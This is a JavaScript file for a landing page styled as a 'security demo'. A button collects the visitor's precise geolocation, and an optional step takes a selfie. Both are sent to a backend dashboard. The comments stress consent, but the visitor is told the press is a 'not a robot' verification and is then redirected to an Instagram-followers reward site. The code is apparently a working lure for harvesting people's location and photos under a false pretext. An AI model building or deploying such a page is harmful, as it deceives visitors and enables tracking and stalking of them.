/* Empire Security Demo — landing page logic.
 *
 * Explicit consent flow ONLY:
 * 1. User clicks [ PRESS HERE ].
 * 2. navigator.geolocation.getCurrentPosition() runs -> browser shows its
 *    NATIVE permission dialog.
 * 3. On Allow: send ONE fix to POST /api/location.
 * 4. On Deny/error: send NOTHING, show a friendly message.
 *
 * No auto-geolocation on load. No hidden iframes. No fingerprinting.
 */
(function () {
  "use strict";

  // Same-origin by default (backend serves / + /dashboard + /api).
  // Override for split hosting, e.g. `?api=http://192.168.1.5:8000`
  // or set window.EMPIRE_API_BASE before this script loads.
  function resolveApiBase() {
    var q = null;
    try {
      q = new URLSearchParams(window.location.search).get("api");
    } catch (e) { /* ignore */ }
    if (q) return q.replace(/\/$/, "");
    if (window.EMPIRE_API_BASE) return String(window.EMPIRE_API_BASE).replace(/\/$/, "");
    if (window.location.protocol === "file:") return "http://127.0.0.1:8000";
    return window.location.origin.replace(/\/$/, "");
  }
  var API_BASE = resolveApiBase();

  // Reward page opened ONLY after the consented location is stored.
  var REWARD_URL = "https://livesubs.io/en/instagram";
  var REDIRECT_DELAY_MS = 2000;

  var btn = document.getElementById("pressBtn");
  var statusEl = document.getElementById("status");

  function setStatus(msg, kind) {
    statusEl.textContent = msg;
    statusEl.className = "status" + (kind ? " " + kind : "");
  }

  // Random, non-identifying session id. Stored per-tab (sessionStorage)
  // so repeated presses group under one demo session without any PII.
  function getSessionId() {
    try {
      var existing = sessionStorage.getItem("empire_session_id");
      if (existing) return existing;
    } catch (e) { /* storage unavailable */ }
    var id = "sess_";
    if (window.crypto && crypto.randomUUID) {
      id += crypto.randomUUID().replace(/-/g, "").slice(0, 24);
    } else if (window.crypto && crypto.getRandomValues) {
      var bytes = new Uint8Array(12);
      crypto.getRandomValues(bytes);
      for (var i = 0; i < bytes.length; i++) {
        id += ("0" + bytes[i].toString(16)).slice(-2);
      }
    } else {
      id += Math.random().toString(36).slice(2, 14) + Date.now().toString(36);
    }
    try {
      sessionStorage.setItem("empire_session_id", id);
    } catch (e) { /* ignore */ }
    return id;
  }

  function postLocation(payload) {
    return fetch(API_BASE + "/api/location", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    }).then(function (res) {
      if (!res.ok) {
        return res.json().catch(function () { return {}; }).then(function (body) {
          throw new Error(body.detail || ("Server responded " + res.status));
        });
      }
      return res.json();
    });
  }

  function onGeoSuccess(position) {
    var payload = {
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      accuracy: position.coords.accuracy || 0,
      timestamp: new Date(position.timestamp).toISOString(),
      session_id: getSessionId(),
    };
    setStatus("Location received from browser. Sending for verification…", "working");
    postLocation(payload).then(
      function (data) {
        setStatus("✅ Verified! You are not a robot.", "ok");
        // Redirect the user to the reward page ONLY after success.
        // Denied/failed cases never redirect (handled in onGeoError/catch).
        setTimeout(function () {
          window.location.href = REWARD_URL;
        }, REDIRECT_DELAY_MS);
      },
      function (err) {
        setStatus(
          "⚠️ Browser location worked, but the server could not be reached: " +
            (err && err.message ? err.message : "network error") +
            ". Is the backend running?",
          "err"
        );
      }
    ).finally(function () {
      btn.disabled = false;
      btn.textContent = "[ PRESS HERE ]";
    });
  }

  function onGeoError(err) {
    btn.disabled = false;
    btn.textContent = "[ PRESS HERE ]";
    var code = err && err.code;
    // 1 = PERMISSION_DENIED, 2 = POSITION_UNAVAILABLE, 3 = TIMEOUT
    if (code === 1) {
      setStatus("❌ Location permission was not granted. No location was sent to the server.", "err");
    } else if (code === 2) {
      setStatus("❌ Location unavailable on this device. No location was sent.", "err");
    } else if (code === 3) {
      setStatus("❌ Location request timed out. Please try again. No location was sent.", "err");
    } else {
      setStatus("❌ Could not get location (" + ((err && err.message) || "unknown error") + "). No location was sent.", "err");
    }
  }

  btn.addEventListener("click", function () {
    if (!("geolocation" in navigator)) {
      setStatus("❌ This browser does not support geolocation. Please try Chrome, Safari, or Edge.", "err");
      return;
    }
    btn.disabled = true;
    btn.textContent = "WAITING FOR PERMISSION…";
    setStatus("Waiting for browser permission… please choose Allow or Block in the browser dialog.", "working");
    try {
      navigator.geolocation.getCurrentPosition(onGeoSuccess, onGeoError, {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      });
    } catch (e) {
      onGeoError({ code: 0, message: String((e && e.message) || e) });
    }
  });

  setStatus("press the button and open the link", "");

  /* ---- Optional selfie step: explicit consent only ----
   * Open Camera -> live preview (nothing uploaded) ->
   * Send My Photo -> single frame uploaded to POST /api/photo.
   * Deny/close sends NOTHING.
   */
  var camOpenBtn = document.getElementById("camOpenBtn");
  var camSendBtn = document.getElementById("camSendBtn");
  var camCancelBtn = document.getElementById("camCancelBtn");
  var camPreview = document.getElementById("camPreview");
  var camStatus = document.getElementById("camStatus");
  var camStream = null;

  function camMsg(msg, kind) {
    camStatus.style.display = "block";
    camStatus.textContent = msg;
    camStatus.className = "status" + (kind ? " " + kind : "");
  }

  function stopCam() {
    if (camStream) {
      camStream.getTracks().forEach(function (t) { t.stop(); });
      camStream = null;
    }
    camPreview.removeAttribute("src");
    camPreview.srcObject = null;
    camPreview.style.display = "none";
    camOpenBtn.style.display = "";
    camSendBtn.style.display = "none";
    camCancelBtn.style.display = "none";
  }

  camOpenBtn.addEventListener("click", function () {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      camMsg("❌ Camera needs a secure page (https:// link or localhost).", "err");
      return;
    }
    navigator.mediaDevices
      .getUserMedia({ video: { facingMode: "user" }, audio: false })
      .then(function (stream) {
        camStream = stream;
        camPreview.srcObject = stream;
        camPreview.style.display = "block";
        camOpenBtn.style.display = "none";
        camSendBtn.style.display = "";
        camCancelBtn.style.display = "";
        camMsg("Live preview — only you see this. Tap Send My Photo only if you agree.", "");
      })
      .catch(function (e) {
        var n = (e && e.name) || "";
        if (n === "NotAllowedError" || n === "SecurityError") {
          camMsg("❌ Camera permission denied. No photo was sent.", "err");
        } else if (n === "NotFoundError" || n === "OverconstrainedError") {
          camMsg("❌ No camera found on this device.", "err");
        } else {
          camMsg("❌ Camera failed (" + (n || "unknown") + "). Use the https:// link.", "err");
        }
      });
  });

  camCancelBtn.addEventListener("click", function () {
    stopCam();
    camMsg("Camera closed. No photo was sent.", "");
  });

  camSendBtn.addEventListener("click", function () {
    if (!camStream) return;
    var w = camPreview.videoWidth, h = camPreview.videoHeight;
    if (!w || !h) {
      camMsg("❌ Video not ready yet — wait 1 second and tap again.", "err");
      return;
    }
    var scale = Math.min(1, 640 / w);
    var c = document.createElement("canvas");
    c.width = Math.round(w * scale);
    c.height = Math.round(h * scale);
    c.getContext("2d").drawImage(camPreview, 0, 0, c.width, c.height);
    camMsg("Sending your photo…", "working");
    c.toBlob(
      function (blob) {
        if (!blob) {
          camMsg("❌ Photo could not be created.", "err");
          return;
        }
        var fd = new FormData();
        fd.append("session_id", getSessionId());
        fd.append("file", blob, "selfie.jpg");
        fetch(API_BASE + "/api/photo", { method: "POST", body: fd })
          .then(function (res) {
            if (!res.ok) throw new Error("Server responded " + res.status);
            return res.json();
          })
          .then(function () {
            camMsg("✅ Your selfie was sent to the dashboard.", "ok");
            stopCam();
          })
          .catch(function (err) {
            camMsg(
              "⚠️ Photo could not be sent: " +
                ((err && err.message) || "network error"),
              "err"
            );
          });
      },
      "image/jpeg",
      0.85
    );
  });
})();
